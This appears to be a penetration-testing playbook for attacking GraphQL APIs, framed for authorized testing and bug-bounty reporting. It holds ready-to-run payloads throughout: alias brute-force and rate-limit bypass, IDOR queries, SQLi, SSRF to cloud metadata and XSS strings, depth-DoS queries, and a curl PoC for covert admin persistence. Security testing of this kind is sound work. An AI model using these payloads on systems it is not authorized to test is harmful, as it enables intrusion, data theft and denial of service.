---
name: "GraphQL Testing"
description: "Attack GraphQL endpoints: introspection/field-suggestion schema recovery, alias/batch brute-force and authz bypass, nested-query DoS, and injection through resolver arguments. Maps GraphQL-specific patterns onto IDOR/BFLA/SQLi/SSRF."
tags: ["info_disclosure", "idor", "auth_bypass", "sqli", "ssrf", "business_logic"]
recommended_tools: ["curl", "graphql-cop", "clairvoyance", "InQL (Burp)", "python3"]
vuln_classes: ["info_disclosure", "idor", "auth_bypass", "sqli", "ssrf", "business_logic"]
domain: api
phase: exploitation
---
# GraphQL Testing

Maps to vuln_classes: info_disclosure (introspection), idor, auth_bypass (BFLA via aliases), sqli/ssrf/command_injection (resolver-arg injection), business_logic.

## Where to look
`/graphql`, `/graphql/console`, `/api/graphql`, `/v1/graphql`, `/query`, `/gql`, Apollo/Hasura/Yoga signatures. Both POST `{"query":"..."}` and GET `?query=`. Watch for `application/json` 200s with `{"data":...,"errors":...}`.

## Payload ladder: detect -> confirm -> escalate

### 1. Introspection (full schema recovery)
```
curl -s https://target/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```
Proof: response contains `__schema` with type/field names. If introspection is disabled, recover schema via FIELD SUGGESTION (server says "Did you mean 'X'?" on typos) using clairvoyance, or via `{__type(name:"Query"){fields{name}}}`.

### 2. Alias-based brute-force / rate-limit bypass
Batch many attempts in ONE request via aliases (each runs server-side, often bypassing per-request rate limits / login throttles):
```
mutation { a:login(user:"x",pass:"p1"){token} b:login(user:"x",pass:"p2"){token} c:login(...) ... }
```
Proof: one alias returns a `token` while per-request brute force was throttled.

### 3. BFLA / IDOR via aliases & object IDs
Request privileged/other-user objects directly; mix a benign alias with a sensitive one to slip past naive checks:
```
{ me{id} admin: organization(id:"<A_ORG>"){ members{ email role } }
  victim: user(id:"<OTHER_ID>"){ email billing } }
```
Proof: cross-account/admin fields returned to a low-priv token. Decode Relay global IDs (`base64 -d` of `User:457`) and increment.

### 4. Batch mutation authz skip
Bulk endpoints often validate only the first array element:
```
[{"id":"<MINE>","action":"noop"},{"id":"<FOREIGN>","action":"delete"}]
```

### 5. Resolver-argument injection
GraphQL args flow into SQL/OS/HTTP sinks. Inject through string args:
```
{ users(filter:"' OR '1'='1"){id} }              # SQLi -> route to sql-injection ladders
{ fetch(url:"http://169.254.169.254/..."){body} } # SSRF -> route to ssrf-testing
{ search(q:"<img src=x onerror=alert(1)>"){...} } # stored XSS sink
```

### 6. Nested-query / circular DoS (misconfig)
```
{ a:posts{author{posts{author{posts{author{id}}}}}} }   # depth amplification
```
Proof: no depth/complexity limit -> large response / timeout. Report as misconfig, do not actually DoS authorized targets.

## Mutation discovery
From the recovered schema, enumerate `Mutation` fields — these are the state-changing, authz-sensitive operations (createUser, updateRole, deleteX, transfer). Test each for BFLA.

## Tooling
```
graphql-cop -t https://target/graphql           # quick misconfig audit (introspection, batching, field suggestion)
clairvoyance -o schema.json https://target/graphql   # schema recovery when introspection disabled
```

## Deterministic proof signal
- Introspection/field-suggestion returns schema type names => info_disclosure.
- A low-priv/anon token reads another user's or admin object's private fields (email/billing/role) via a single GraphQL response => idor/auth_bypass.
- Resolver-arg injection yields the underlying sink's proof signal (DB error/`root:x:0:0:`/OAST callback) => route to the matching skill.
- Alias batch returns a success (token/200) where per-request was rate-limited => rate-limit bypass.

CWE-639, CWE-863, CWE-285, plus the injected sink's CWE.

## Modern techniques & real-world CVEs (via recon-skills)

### Endpoint & stack fingerprinting (beyond `/graphql`)
Extra paths worth probing: `/graph`, `/api/v2/graphql`, `/internal/graphql`. A response reflecting `__schema` or `__type` confirms GraphQL even without a known path. Grep JS bundles for the query surface:
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
grep -E 'apollo|ApolloClient|graphql-tag|gql`|operationName|GRAPHQL_URI|__typename' bundle.js
```
Server fingerprints steer bypass choice: Apollo (JS), `graphene`/`strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel), Relay (React global IDs). Hardcoded query strings in bundles often leak the schema when introspection is off.

### REST <-> GraphQL state-desync / race (the crown-jewel class)
The highest-severity modern GraphQL bugs are not in GraphQL alone but in **dual-write surfaces** where the same resource is mutable via BOTH REST and GraphQL, and the two disagree on ground truth. Method:
1. Document every resource modifiable via both APIs.
2. Replay each GraphQL mutation as a lower-priv user — does the resolver enforce the same authz as the equivalent REST call? (GraphQL is often the "newer, less-audited REST" and skips accumulated checks.)
3. Hunt persistent privilege after revocation: revoke via REST, then re-assert via the mirror mutation, then read state via both APIs and compare.

Verified GitHub-pattern PoC — covert admin persistence after team removal:
```bash
# Revoke via REST
curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"
# Re-assert admin via GraphQL mutation (attacker token)
curl -X POST https://api.target.com/graphql -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input:{repositoryId:\"REPO_ID\",teamId:\"TEAM_ID\",permission:ADMIN}){clientMutationId} }"}'
# Verify: UI shows team removed, GraphQL state still ADMIN -> covert write/CI-secret access
```
Same shape via a repo-transfer race: initiate transfer to another org via REST, then call `updateTeamsRepository` on the transferred repo ID before ownership state settles -> original team retains admin on a repo now owned by a different org. Deterministic (not timing-flaky) desyncs are reportable; document the exact 2-run curl sequence.

### Introspection-block & defense bypasses
```graphql
# WAF blocking the literal __schema token -> alias every field
{ s: __schema { t: types { n: name } } }
```
- Field-suggestion probe: send `{ unknownField }`; a `"Did you mean: [realField]?"` error enumerates the schema despite introspection being disabled. Automate with `clairvoyance -w wordlist.txt`.
- Depth-limit bypass via **fragment spread** (recursive fragments inflate effective depth past a naive depth counter):
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```
- Persisted-query / operation allowlisting bypass: send a bogus `extensions.persistedQuery` hash — if the server falls back to executing the ad-hoc `query`, the allowlist is bypassable. Also try dev/staging/internal-proxy endpoints that skip whitelisting.

### Negative query-cost rate-limit bypass
Query-cost calculators that don't floor at zero can be driven negative, refilling the leaky-bucket:
```graphql
query { products(first:-100) { edges { node { id } } } }   # H1 #481518 (Shopify), 2019
```

### Alias-batching vs races — know when it actually wins
Alias batching is a single-RTT recon/amplification primitive, NOT a universal race weapon. Whether aliased mutations win a race depends on the resolver execution model:

| Resolver model | Aliased-mutation behavior | Wins race? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | aliases run concurrently, share batched state | YES — one HTTP request amplifies the race N times |
| Single-threaded / one DB connection per request | aliases run serially; first closes the door | NO — combine with parallel HTTP |
| Federated gateway (Apollo Federation) | sub-queries dispatched concurrently to subgraphs | depends per subgraph |

Verified: 10 aliased `redeemCoupon` in one request on single-threaded Flask+SQLite -> only `r1` succeeds; the same 10 as 20 parallel single-packet HTTP POSTs -> 20 successes. Operator rule: for true race exploitation, drive parallel HTTP / Turbo Intruder single-packet, using aliases only as the amplifier.

### Disclosed reports & CVEs (2019-2024)
- **H1 #489146** (2019, $20k) — broken field-level authz on the `User` type: `user(id:...)` returned `email`, `backup_codes_hash`, `totp_enabled`, recovery-phone metadata to any authenticated user. Migration added the type with no per-field authz.
- **H1 #2218334** (2023) — `destroyLlmConversation(input:{id:"<victim>"})` mutation IDOR on a pre-release Copilot feature; new LLM mutation shipped without the authz decorator. Watch AI/LLM feature mutations specifically.
- **H1 #2207248** (2024, $5k) — Shopify `billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop>")` cross-tenant IDOR: resolver authorized the requester's shop but not that the invoice belonged to it.
- **H1 #1066203** (2020) — Stripe `updateAtlasApplicationPerson(input:{personId:"<victim>"})` cross-tenant mutation IDOR: scoped to "admin of some merchant," not "admin of the merchant owning this person."
- **H1 #1864188** (2023, $3k) — EXNESS `allTicks(source:"http://169.254.169.254/latest/meta-data/")` SSRF: URL arg dereferenced with no scheme/host allowlist.
- **H1 #2293642** (2024) — EXNESS attribute-batching DoS on an unauth `/graphql`: N batched ops each requesting deep attribute trees, sustained to origin OOM; no depth/complexity/batch-size limits.
- **CVE-2023-2478** (GitLab, CVSS 9.6) — `runnerUpdate(input:{id:"<attacker_runner>",associatedProjects:["<victim_project>"]})` auth bypass: no Maintainer check on the target project, letting any user bind a malicious runner to intercept CI jobs (secrets, RCE).
- **AS Watson** (2023) — unauthenticated `createAdminUser(input:{email,role:"ADMIN",password}){token}` reachable after introspection-aided discovery; schema lacked per-field authz directives.

### Mass-assignment chain (net-new note)
GraphQL mutations merge full input objects — add unexpected fields (`isAdmin:true`, `verified:true`, `role:"ADMIN"`) to any create/update mutation and check for privilege/state escalation before assuming the server strips them.
